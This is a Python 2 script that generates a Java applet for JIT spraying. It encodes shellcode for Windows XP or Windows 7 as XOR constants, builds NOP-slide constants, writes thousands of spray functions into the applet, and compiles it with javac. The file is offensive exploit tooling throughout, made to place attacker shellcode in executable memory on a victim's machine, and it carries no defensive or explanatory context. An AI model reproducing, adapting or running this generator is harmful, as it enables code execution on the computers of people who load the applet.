import os,sys


def get_shellcode(platform):
    if platform == 'xp':
        template = 'shellcode-xp.txt'
    elif platform == 'win7':
        template = 'shellcode-win7.txt'
    else:
        return ""

    buf = open(template, 'rb').read().replace(' ', '').replace('\n', '').replace('\r','').replace('81F2', '')

    result = ''

    for i in range(0, len(buf)/8):
        result += '\tb ^= 0x%s%s%s%s;' % (buf[i*8 + 6:i*8+8], buf[i*8 + 4:i*8+6], buf[i*8 + 2:i*8+4], buf[i*8:i*8+2])
   
    return result

def generate_nop(numNopSlides):
    result = ''
    for i in range(1, numNopSlides):
        result += '\t b ^= 0x3C909090;'
   

    return result

def generate_spray_functions(numSpray, numNopSlides, platform):
    result = '';

    spray = open('spray.template', 'rb').read().replace('$spray', generate_nop(numNopSlides)).replace('$shellcode', get_shellcode(platform))

    print len(spray)
    
    for i in range(0, numSpray):
        funcname = 'spray%06d' % i
        result += 'public int spray%06d' % i + spray

    return result

def generate_spray_calls(numSpray):
    result = 'for (int i = 0; i < 100000; ++ i) {\n'

    for i in range(0, numSpray):
        result += 'spray%06d(1);\n' % i
    
    result += '}\n'

    #result += 'for (int i = 0; i < 1500; ++ i) {\n'

    #for i in range(0, numSpray):
        #result += 'spray%06d(2);\n' % i
    
    #result += '}\n'

    return result

if __name__ == '__main__':
    try:
        numSpray = int(sys.argv[1])
        numNopSlides = int(sys.argv[2])
        platform = sys.argv[3]
    except:
        numSpray = 10000
        numNopSlides = 174700
        platform = 'xp'

    buf = open('TestJITApplet.java.tmplate', 'rb').read()
    buf = buf.replace('$spray_functions', generate_spray_functions(numSpray, numNopSlides, platform))
    buf = buf.replace('$call_spray_functions', generate_spray_calls(numSpray))
    
    open('TestJITApplet.java', 'wb').write(buf)

    os.system("javac TestJITApplet.java")
